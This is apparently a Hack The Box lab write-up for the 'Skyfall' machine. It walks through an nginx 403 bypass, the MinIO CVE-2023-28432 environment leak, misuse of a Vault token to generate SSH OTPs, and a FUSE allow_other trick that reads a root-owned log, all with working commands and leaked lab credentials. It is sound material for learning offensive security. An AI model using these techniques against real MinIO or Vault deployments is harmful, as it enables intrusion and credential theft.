# Skyfall

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

## Reconnaissance

### Port scan

```bash
╰─➤  fn 10.10.11.254             
Running initial fast Nmap scan on 10.10.11.254...
Open ports: 22,80
Running detailed Nmap scan on ports: 22,80...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-01 20:45 IST
Nmap scan report for 10.10.11.254 (10.10.11.254)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.46 seconds
Scan complete. Results saved in ports.scan                                                     
```

### Subdomain

You can `Ctrl+u` to view the web page source code and see we have 2 sub-domains.

```bash
10.10.11.254 skyfall.htb demo.skyfall.htb
#/etc/hosts file
```

## Web Attack

### Nginx ACL + Flask strip()&#x20;

* We were able to login with default creds given: `guest:guest`

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

I tried for LFI with remaining filename, or upload .php and trying to access it from somewhere.\
Although I didn't find anything, we can further move on for other approach.

<figure><img src="../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

The only interesting thing was this 403, WHY?\
Well if we try to access `/beta` the flask app restricts us, but for `/metrics` nginx doesn't allow us to go forward, so that means....there's a website which flask can serve us if we bypass nginx 403.

Googling `Nginx 403 bypass hacktricks` gives us this beautiful resource

{% embed url="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx&ved=2ahUKEwiqqYWeh6KIAxV1R2wGHUxOO1QQFnoECB4QAQ&usg=AOvVaw2797Atc7v12zK2A5m5UDiU" %}

<figure><img src="../../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

Third title worked for me, **Unsafe path restriction** which leads us to the following page

{% embed url="https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass" %}

<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

Our nginx version is `nginx/1.18.0 (Ubuntu)`

We will add `0c` in our request&#x20;

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

And VoiLA!!, we got in.\


### Info

Why this attack worked?\
It's because nginx was set to return 403 on `/metrics` request, but we were sending `/metrics\x0c` request which was considered as different request and it was forwarded later to Flask.\
Flask usually strips URLs before parsing them, so our `/metrics\x0c` became `/metrics` and the data of the webpage was returned back to us.&#x20;



Anyway, back to web attack.\
If we scroll down a bit, we can see it's using `minIO` with:\


```
minio_software_version_info
server: minio-node2:9000
version: 2023-03-13T19:46:17Z
```

It also gives us `minIO` endpoint URL

```
minio_endpoint_url
demo.skyfall.htb
http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster
```

Let's add this subdomain in our `/etc/hosts` file.

* MinIO
  * MinIO is a High Performance Object Storage API compatible with Amazon S3 cloud storage service.

It's like aws cli, with few other features.\


### MinIO bug&#x20;

If we search the version number on google we find this article

{% embed url="https://blog.min.io/security-advisory-stackedcves/" %}

{% embed url="https://www.sentinelone.com/blog/cve-2023-28432/" %}

```javascript
The vulnerability exists in the API endpoint 
http://your-ip:9000/minio/bootstrap/v1/verify. 
Use the POC mentioned above by sending the request to retrieve 
all environment variables.
```

Lets try curl the endpoint with the above URL.

```bash
─➤  curl -X POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify | jq

<< SNIPPED >>

  "MinioEnv": {
    "MINIO_ACCESS_KEY_FILE": "access_key",
    "MINIO_BROWSER": "off",
    "MINIO_CONFIG_ENV_FILE": "config.env",
    "MINIO_KMS_SECRET_KEY_FILE": "kms_master_key",
    "MINIO_PROMETHEUS_AUTH_TYPE": "public",
    "MINIO_ROOT_PASSWORD": "GkpjkmiVmpFuL2d3oRx0",
    "MINIO_ROOT_PASSWORD_FILE": "secret_key",
    "MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww",
    "MINIO_ROOT_USER_FILE": "access_key",
    "MINIO_SECRET_KEY_FILE": "secret_key",
    "MINIO_UPDATE": "off",
    "MINIO_UPDATE_MINISIGN_PUBKEY": "RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"
  }
}
                                                                                              
```

YESSSSSS.... we got secret username and password.....

* Install `mc` to interact with the minIO instance

## User shell

Minio client&#x20;

```bash
╰─➤  ./mc alias set skyfall http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0                                                                                                                                130 ↵
mc: Configuration written to `/home/kali/.mc/config.json`. Please update your access credentials.
mc: Successfully created `/home/kali/.mc/share`.
mc: Initialized share uploads `/home/kali/.mc/share/uploads.json` file.
mc: Initialized share downloads `/home/kali/.mc/share/downloads.json` file.
Added `skyfall` successfully.
```

Help menu of `mc` will tell us how to list files, \


```bash
  ls         list buckets and objects

# ./mc ls --help
#  --versions                         list all versions                                                                                                                                                                                         
#  --recursive, -r                    list recursively               
ls --recursive skyfall
ls --recursive --version skyfall
```

**What's version?** \
It's basically like git commit, new version will have different data than previous version.

```bash
╰─➤  ./mc ls --recursive --versions skyfall                                                                                                                                                                                                1 ↵
[2023-11-08 10:29:15 IST]     0B askyy/
[2023-11-08 11:05:28 IST]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf
[2023-11-10 03:07:25 IST] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz
[2023-11-10 03:07:09 IST] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz
[2023-11-10 03:06:30 IST] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz
[2023-11-08 10:28:56 IST]     0B btanner/
[2023-11-08 11:05:36 IST]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf
[2023-11-08 10:28:33 IST]     0B emoneypenny/
[2023-11-08 11:05:56 IST]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf
[2023-11-08 10:28:22 IST]     0B gmallory/
[2023-11-08 11:06:02 IST]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf
[2023-11-08 05:38:01 IST]     0B guest/
[2023-11-08 05:38:05 IST]  48KiB STANDARD null v1 PUT guest/Welcome.pdf
[2023-11-08 10:29:05 IST]     0B jbond/
[2023-11-08 11:05:45 IST]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf
[2023-11-08 10:28:10 IST]     0B omansfield/
[2023-11-08 11:06:09 IST]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf
[2023-11-08 10:28:45 IST]     0B rsilva/
[2023-11-08 11:05:51 IST]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf

```

Let's download `askyy/home_backup` (all version)

We'll use `mc cp` for this

```bash
╰─➤  ./mc cp --vid 3c498578-8dfe-43b7-b679-32a3fe42018f skyfall/askyy/home_backup.tar.gz  ./askyy/v1/v1.tar.gz                                                                                                                             1 ↵
...nd.skyfall.htb/askyy/home_backup.tar.gz: 1.18 MiB / 1.18 MiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 247.21 KiB/s 4s                                                                                                                                                                                                                                               


╰─➤  ./mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 skyfall/askyy/home_backup.tar.gz  ./askyy/v2/v2.tar.gz 
...nd.skyfall.htb/askyy/home_backup.tar.gz: 2.64 KiB / 2.64 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 2.11 KiB/s 1s                                                                                                                                                                                                                                               
  

╰─➤  ./mc cp --vid 25835695-5e73-4c13-82f7-30fd2da2cf61  skyfall/askyy/home_backup.tar.gz  ./askyy/v3/v3.tar.gz                             
...nd.skyfall.htb/askyy/home_backup.tar.gz: 2.48 KiB / 2.48 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 2.07 KiB/s 1s
```

Great we download all imp files, lets check what's the difference in all of these files...

```bash
─➤  find . -type f -exec md5sum {} \; | grep -v 'terraform' | sort               
1f98b8f3f3c8f8927eca945d59dcc1c6  ./v3/.bashrc
22bfb8c1dd94b5f3813a2b25da67463f  ./v2/.bash_logout
22bfb8c1dd94b5f3813a2b25da67463f  ./v3/.bash_logout
2b6563a67dcb356b437e1091079bd485  ./v2/.ssh/id_rsa
673985d5b313f5bbcb57f6f389c31a0f  ./v1/v1.tar.gz
68b329da9893e34099c7d8ad5cb9c940  ./v2/.bash_history
68b329da9893e34099c7d8ad5cb9c940  ./v2/.ssh/authorized_keys
68b329da9893e34099c7d8ad5cb9c940  ./v2/.viminfo
68b329da9893e34099c7d8ad5cb9c940  ./v3/.bash_history
68b329da9893e34099c7d8ad5cb9c940  ./v3/.ssh/authorized_keys
78f15c5244fe3d6013c52a0cec92c8a2  ./v3/v3.tar.gz
86079bcd6bd8879c36ee60654f8640a8  ./v2/.ssh/id_rsa.pub
a9b4e1836c4dee94570e252880d5c32e  ./v2/.bashrc
d1d5bcb98383140b80c96786e7f7a8bd  ./v2/v2.tar.gz
d41d8cd98f00b204e9800998ecf8427e  ./v2/.cache/motd.legal-displayed
d41d8cd98f00b204e9800998ecf8427e  ./v2/.sudo_as_admin_successful
d41d8cd98f00b204e9800998ecf8427e  ./v3/.cache/motd.legal-displayed
d41d8cd98f00b204e9800998ecf8427e  ./v3/.sudo_as_admin_successful
f4e81ade7d6f9fb342541152d08e7a97  ./v2/.profile
f4e81ade7d6f9fb342541152d08e7a97  ./v3/.profile
```

I decide to remove all similar and non-intersting files,

```bash
╰─➤  find . -type f -exec md5sum {} \; | grep -v 'terraform' | sort | grep -vE 'f4e81ade7d6f9fb342541152d08e7a97|d41d8cd98f00b204e9800998ecf8427e|68b329da9893e34099c7d8ad5cb9c940|22bfb8c1dd94b5f3813a2b25da67463f' 
1f98b8f3f3c8f8927eca945d59dcc1c6  ./v3/.bashrc
2b6563a67dcb356b437e1091079bd485  ./v2/.ssh/id_rsa
673985d5b313f5bbcb57f6f389c31a0f  ./v1/v1.tar.gz
78f15c5244fe3d6013c52a0cec92c8a2  ./v3/v3.tar.gz
86079bcd6bd8879c36ee60654f8640a8  ./v2/.ssh/id_rsa.pub
a9b4e1836c4dee94570e252880d5c32e  ./v2/.bashrc
d1d5bcb98383140b80c96786e7f7a8bd  ./v2/v2.tar.gz
```

Reading `./v2/.ssh/id_rsa.pub` reveals the username `askyy` (`askyy@skyfall`)

`./v2/.ssh/id_rsa` has ssh private key \
I tried ssh'ing the server with this private key, it doesn't work for some reason.

```bash
╰─➤  ssh -i ./v2/.ssh/id_rsa askyy@skyfall.htb #(yeah i did chmod 600)
The authenticity of host 'skyfall.htb (10.10.11.254)' can't be established.
ED25519 key fingerprint is SHA256:mUK/F6yhenOEZEcLnWWWl3FVk3PiHC8ETKpL3Sz773c.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'skyfall.htb' (ED25519) to the list of known hosts.
(askyy@skyfall.htb) Password: 
# SEEE it doesn"t work :(
```

Let's remove those files from our search as well.

```bash
╰─➤  find . -type f -exec md5sum {} \; | grep -v 'terraform' | sort | grep -vE 'f4e81ade7d6f9fb342541152d08e7a97|d41d8cd98f00b204e9800998ecf8427e|68b329da9893e34099c7d8ad5cb9c940|22bfb8c1dd94b5f3813a2b25da67463f|id_rsa*|tar'  
1f98b8f3f3c8f8927eca945d59dcc1c6  ./v3/.bashrc
a9b4e1836c4dee94570e252880d5c32e  ./v2/.bashrc
```

Hmm interesting........

### Hashcorp&#x20;

```bash
╰─➤  diff v3/.bashrc v2/.bashrc
42a43,45
> export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
> export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
> 
```

<figure><img src="../../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

It's a hashicorp token, what's the token for? (Answer straight from google)

> **What is HashiCorp Vault used for?**\
> It is used to secure, store and protect secrets and other sensitive data using a UI, CLI, or HTTP API. A secret is anything that you want to tightly control access to, such as tokens, API keys, passwords, encryption keys or certificates.

It's basically like a password management tool, which gives you one time sign in password and rotates it everytime. Perhaps that why signing in with private key didn't work bcuz hashicorp changed the password and keys and that was the key valid only for a single login session. (this is just a guess)

#### Hashicorp client

You can download it from here&#x20;

{% embed url="https://developer.hashicorp.com/vault/install" %}

We can login and check if everything is working fine

```bash
╰─➤  export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb" 

╰─➤  ./vault login       
Token (will be hidden): 
WARNING! The VAULT_TOKEN environment variable is set! The value of this
variable will take precedence; if this is unwanted please unset VAULT_TOKEN or
update its value accordingly.

Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
token_accessor       rByv1coOBC9ITZpzqbDtTUm8
token_duration       430875h41m13s
token_renewable      true
token_policies       ["default" "developers"]
identity_policies    []
policies             ["default" "developers"]

```

We are having developers role.

#### Ssh creds

Since the ssh didn't worked last time, because hashicorp changes password everytime, I decided to move on and get the creds working.

{% embed url="https://developer.hashicorp.com/vault/api-docs/secret/ssh#generate-ssh-credentials" %}

The above resource will guide us how to get password from the server.

```bash
#sample input snip i took from above resource
curl \
    --header "X-Vault-Token: ..." \
    --request POST \
    --data @payload.json \
    http://127.0.0.1:8200/v1/ssh/creds/my-role

# X-Valut Token is present in our env variable already
# my-role is something we need to figure out, if you go through the above resource, 
# you can find list-roles section

╰─➤  ./vault list ssh/roles  
Keys
----
admin_otp_key_role
dev_otp_key_role

# Our role ofc will be dev_otp_key_role
```

Inputing all values, we can now have user shell (FINALLY)\


* Contents of payload.json file

```json
{
  "ip": "10.10.11.254",
  "username": "askyy"
}
```

```bash
╰─➤  curl \
    --header "X-Vault-Token: $VAULT_TOKEN" \
    --request POST \
    --data @payload.json \
    "$VAULT_ADDR/v1/ssh/creds/dev_otp_key_role" -s | jq 
{
  "request_id": "169b4ad6-4f97-f3f2-dbb1-5f0d10f728b3",
  "lease_id": "ssh/creds/dev_otp_key_role/E9e2CSxalqEpmsyKf8Jq3QRf",
  "renewable": false,
  "lease_duration": 2764800,
  "data": {
    "ip": "10.10.11.254",
    "key": "3aad6a0c-cfad-68cf-34cf-c0d72257d8c8",
    "key_type": "otp",
    "port": 22,
    "username": "askyy"
  },
  "wrap_info": null,
  "warnings": null,
  "auth": null
}

```

```bash
╰─➤  ssh askyy@skyfall.htb                                  
(askyy@skyfall.htb) Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
askyy@skyfall:~$ id
uid=1000(askyy) gid=1000(askyy) groups=1000(askyy)
askyy@skyfall:~$ 
## DONEEEEEE
```

## Root shell

```bash
askyy@skyfall:/tmp/heap$ sudo -l
Matching Defaults entries for askyy on skyfall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml

askyy@skyfall:/tmp/heap$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[-] Master token found in config: ****************************
[>] Enable 'debug' mode for details
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
askyy@skyfall:/tmp/heap$ ls

```

Master token is basically root token, which can do anything, our end goal is to get master token and get root ssh creds.\
Read more about tokens here:

{% embed url="https://developer.hashicorp.com/vault/docs/concepts/tokens#root-tokens" %}

```bash
askyy@skyfall:/tmp/heap$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d
[>] Checking seal status
[+] Vault sealed: false

askyy@skyfall:/tmp/heap$ ls -la 
total 12
drwxrwxr-x  2 askyy askyy 4096 Sep  1 18:18 .
drwxrwxrwt 13 root  root  4096 Sep  1 18:18 ..
-rw-------  1 root  root   590 Sep  1 18:18 debug.log
```

We can't read the file contents, this might has our master token key.

Since we can decide what directory to put the file in (debug.log), we can play with the filesystem.\
We can see `user_allow_other` option enables in `/etc/fuse.conf` ..... I found a good resource

{% embed url="https://www.cs.nmsu.edu/~pfeiffer/fuse-tutorial/html/security.html" %}

This tutorial explains security flaws of having `user_other_allow`

> In this case, any user making use of the filesystem has root privileges on that filesystem! If the process has access to the actual filesystem, this could easily be used to gain pretty much unlimited access.

Since user is making a file where we specify, and we have `user_other_allow` option enabled, we can try for race conditions. Basically we will create a mount that will intake all data from current folder.

So i.e. \
our\_mount -> original\_folder\
So whatever data comes to original folder (even if as root), we can get that data in our\_mount.

Honestly, this was my first time exploiting FUSE, I couldn't find good resource, so here's one from 0xdf/ippsec: \
[https://github.com/hanwen/go-fuse](https://github.com/hanwen/go-fuse)

We can compile `memfs` from `examples/` folder.

```go
server, err := fuse.NewServer(conn.RawFS(), mountPoint, &fuse.MountOptions{
    Debug: *debug,
    AllowOther: true,
})
//slight change, we need to add AllowOther: true,since it's enabled in /etc/fuse.conf
//if we dont add it, our exploit wont work because by default that feature is off everywhere
```

<figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

&#x20;And done....... we now have admin token.

```bash
export VAULT_ROOT="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"  
```

Edit our payload.json file

```javascript
╰─➤  cat payload.json         
{
  "ip": "10.10.11.254",
  "username": "root"
}
```

Edit our curl command

```bash
─➤  curl \
    --header "X-Vault-Token: $VAULT_ROOT" \
    --request POST \
    --data @payload.json \
    "$VAULT_ADDR/v1/ssh/creds/admin_otp_key_role" -s | jq 
{
  "request_id": "53c328f3-f604-5402-10fd-57d4512642ae",
  "lease_id": "ssh/creds/admin_otp_key_role/LFeN97caTqUAJYAkwDFcdjt4",
  "renewable": false,
  "lease_duration": 2764800,
  "data": {
    "ip": "10.10.11.254",
    "key": "9b0118c3-3084-b4c0-e475-2d556700f4ea",
    "key_type": "otp",
    "port": 22,
    "username": "root"
  },
  "wrap_info": null,
  "warnings": null,
  "auth": null
}

# I changed 2 things, 
# 1st. --header as $VAULT_ROOT
# 2nd. v1/ssh/creds/admin_otp_key_role
#      changed from dev_otp_key_role to admin one 
```

NOW let's ssh.

```bash
─➤  ssh root@skyfall.htb      
(root@skyfall.htb) Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Mar 27 13:20:05 2024 from 10.10.14.46
root@skyfall:~# id
uid=0(root) gid=0(root) groups=0(root)
root@skyfall:~# 
```

FINALLY done.......superb box tbh. Learned a lot since this is my first Insane box.

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning.
